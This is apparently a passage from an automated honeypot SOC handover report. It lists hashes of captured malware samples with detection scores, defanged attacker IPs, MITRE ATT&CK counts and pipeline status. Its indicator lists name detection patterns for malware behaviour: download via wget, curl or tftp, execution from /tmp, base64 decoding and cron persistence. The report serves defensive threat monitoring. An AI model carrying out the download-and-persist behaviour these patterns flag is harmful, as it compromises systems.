| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `36.135.62[.]103` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 7 |
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `194.165.16[.]165` | PL | Flyservers S.A. | **100** ⚠️ | 50 |
| `202.72.196[.]75` | ID | PT Multidata Rancana Prima | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `93.171.242[.]207` | UA | ALFA TELECOM s.r.o. | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `60.249.252[.]94` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 32 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 89 cases |
| Tool 34  | Credential Extractor        | ✅ 268 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (38.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 14 recon entry/entries in table (6 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-09T05:11:28Z_
